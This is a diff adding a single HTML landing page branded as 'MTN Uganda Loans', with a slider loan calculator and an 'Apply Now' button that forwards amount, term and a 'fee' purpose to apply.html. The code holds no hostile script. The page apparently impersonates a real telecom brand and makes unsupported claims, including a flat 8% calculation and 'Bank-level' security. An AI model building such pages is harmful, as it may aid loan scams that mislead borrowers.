@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN Uganda Loans</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* HEADER */
+        .header {
+            background: #ffffff;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+
+        .logo-icon {
+            width: 42px; height: 42px;
+            background: #ffcc00;
+            border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px;
+            color: #004f9f; line-height: 1; text-align: center;
+            border: 2px solid #004f9f;
+        }
+
+        .logo-text {
+            font-weight: 800; font-size: 20px;
+            color: #004f9f; letter-spacing: -0.5px;
+        }
+
+        .header-title {
+            font-size: 15px; font-weight: 700; color: #222;
+            margin-left: 4px; flex: 1;
+        }
+
+        .hamburger { font-size: 22px; color: #333; cursor: pointer; line-height: 1; }
+
+        /* MAIN */
+        .main {
+            flex: 1; display: flex; justify-content: center;
+            padding: 40px 16px 60px;
+        }
+
+        .card {
+            background: #ffffff;
+            width: 100%; max-width: 520px;
+            border-radius: 16px;
+            padding: 40px 36px 36px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+        }
+
+        .card h1 {
+            font-size: 28px; font-weight: 800;
+            color: #111; text-align: center; margin-bottom: 8px;
+        }
+
+        .sub {
+            text-align: center; color: #888; font-size: 14px;
+            margin-bottom: 28px;
+        }
+
+        /* CALCULATOR BOX */
+        .calc-box {
+            border: 2px solid #ffcc00;
+            border-radius: 14px;
+            padding: 24px 20px;
+            margin-bottom: 28px;
+            background: #fffef8;
+        }
+
+        .calc-box h2 {
+            font-size: 16px; font-weight: 800; color: #111;
+            margin-bottom: 22px;
+        }
+
+        .field { margin-bottom: 22px; }
+
+        .field-label {
+            display: flex; justify-content: space-between;
+            align-items: baseline; margin-bottom: 10px;
+        }
+
+        .field-label span:first-child {
+            font-size: 14px; font-weight: 700; color: #333;
+        }
+
+        .field-value { font-size: 17px; font-weight: 800; color: #d4a000; }
+
+        input[type=range] {
+            width: 100%;
+            -webkit-appearance: none;
+            appearance: none;
+            height: 5px;
+            border-radius: 3px;
+            background: #e5e5e5;
+            outline: none; cursor: pointer;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 22px; height: 22px;
+            border-radius: 50%;
+            background: #ffcc00;
+            border: 3px solid #d4a000;
+            box-shadow: 0 2px 6px rgba(212,160,0,0.5);
+            cursor: pointer;
+        }
+
+        input[type=range]::-moz-range-thumb {
+            width: 22px; height: 22px;
+            border-radius: 50%;
+            background: #ffcc00;
+            border: 3px solid #d4a000;
+            cursor: pointer;
+        }
+
+        .range-limits {
+            display: flex; justify-content: space-between;
+            font-size: 11px; color: #999; margin-top: 6px;
+        }
+
+        .payment-box {
+            border: 1.5px solid #ffcc00;
+            border-radius: 10px;
+            padding: 16px;
+            display: flex; justify-content: space-between;
+            align-items: center;
+            background: #fff;
+            margin-top: 4px;
+        }
+
+        .payment-box .label {
+            font-size: 14px; font-weight: 600; color: #333;
+        }
+
+        .payment-box .value {
+            font-size: 20px; font-weight: 900; color: #d4a000;
+        }
+
+        /* APPLY BUTTON */
+        .apply-btn {
+            width: 100%;
+            background: #ffcc00;
+            color: #111;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 6px 16px rgba(255,204,0,0.35);
+        }
+
+        .apply-btn:hover { background: #e6b800; }
+        .apply-btn:active { transform: scale(0.99); }
+
+        /* FEATURES */
+        .features {
+            display: flex; justify-content: space-between;
+            margin-top: 32px; gap: 12px;
+        }
+
+        .feature { flex: 1; text-align: center; }
+
+        .feature-icon { font-size: 26px; margin-bottom: 6px; }
+
+        .feature-title {
+            font-size: 13px; font-weight: 800; color: #111;
+            margin-bottom: 2px;
+        }
+
+        .feature-sub { font-size: 11px; color: #888; }
+
+        /* FOOTER */
+        .footer {
+            background: #111; color: #ffcc00;
+            text-align: center; padding: 18px;
+            font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .card h1 { font-size: 23px; }
+            .header-title { font-size: 13px; }
+            .logo-text { font-size: 18px; }
+            .payment-box .value { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <span class="hamburger">☰</span>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <span class="logo-text">MTN Uganda</span>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Get Your Loan Approved Fast</h1>
+            <p class="sub">Quick approval • Competitive rates • Flexible terms</p>
+
+            <div class="calc-box">
+                <h2>Loan Calculator</h2>
+
+                <div class="field">
+                    <div class="field-label">
+                        <span>Loan Amount</span>
+                        <span class="field-value" id="amountValue">UGX 500,000</span>
+                    </div>
+                    <input type="range" id="amount" min="50000" max="5000000" step="50000" value="500000">
+                    <div class="range-limits">
+                        <span>UGX 50,000</span>
+                        <span>UGX 5,000,000</span>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <div class="field-label">
+                        <span>Loan Term</span>
+                        <span class="field-value" id="termValue">12 months</span>
+                    </div>
+                    <input type="range" id="term" min="6" max="60" step="6" value="12">
+                    <div class="range-limits">
+                        <span>6 months</span>
+                        <span>60 months</span>
+                    </div>
+                </div>
+
+                <div class="payment-box">
+                    <span class="label">Monthly Payment :</span>
+                    <span class="value" id="monthly">UGX 45,000</span>
+                </div>
+            </div>
+
+            <button class="apply-btn" onclick="goApply()">Apply Now</button>
+
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>
+                    <div class="feature-title">Fast Approval</div>
+                    <div class="feature-sub">Within 24 hours</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">💰</div>
+                    <div class="feature-title">Low Rates</div>
+                    <div class="feature-sub">From 8%</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🔒</div>
+                    <div class="feature-title">Secure</div>
+                    <div class="feature-sub">Bank-level</div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const amountEl = document.getElementById('amount');
+        const termEl   = document.getElementById('term');
+        const amountValueEl = document.getElementById('amountValue');
+        const termValueEl   = document.getElementById('termValue');
+        const monthlyEl     = document.getElementById('monthly');
+
+        function fmt(n) {
+            return 'UGX ' + Number(n).toLocaleString();
+        }
+
+        function update() {
+            const amount = Number(amountEl.value);
+            const term   = Number(termEl.value);
+
+            amountValueEl.textContent = fmt(amount);
+            termValueEl.textContent   = term + ' months';
+
+            const monthly = Math.round((amount * 1.08) / term);
+            monthlyEl.textContent = fmt(monthly);
+        }
+
+        amountEl.addEventListener('input', update);
+        termEl.addEventListener('input', update);
+        update();
+
+        function goApply() {
+            const params = new URLSearchParams({
+                amount: amountEl.value,
+                term:   termEl.value,
+                loanType: 'personal',
+                purpose: 'fee'
+            });
+            window.location.href = 'apply.html?' + params.toString();
+        }
+    </script>
+</body>
+</html>
